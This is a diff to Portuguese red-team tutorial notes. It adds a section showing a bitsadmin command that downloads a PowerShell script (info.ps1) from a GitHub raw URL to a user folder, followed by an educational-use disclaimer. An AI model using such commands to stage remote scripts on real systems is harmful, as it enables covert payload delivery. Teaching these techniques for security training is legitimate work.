@@ -194,6 +194,15 @@ C:\Users\admin> dir
 C:\Users\admin> type info.ps1
 ```
 
+## Baixando arquivos com o BITSAdmin 
+
+O BITSAdmin é uma ferramenta antiga do Windows que permite gerenciar transferências de arquivos em segundo plano.
+
+```
+bitsadmin /transfer MeuDownloadJob /download /priority normal https://raw.githubusercontent.com/thiagosmith/scripts-powershell/refs/heads/main/info.ps1 C:\Users\admin\info.ps1
+```
+
+
 # Aviso de Isenção de Responsabilidade – Material de Red Team
 Este material destina-se exclusivamente a fins educacionais, acadêmicos e de conscientização em segurança da informação. As técnicas, exemplos e cenários aqui descritos têm como objetivo demonstrar vulnerabilidades potenciais e auxiliar profissionais de segurança na prevenção, detecção e resposta a ameaças.
 • Não é permitido utilizar este conteúdo para atividades ilegais, maliciosas ou que violem políticas corporativas, regulamentos ou legislações vigentes.
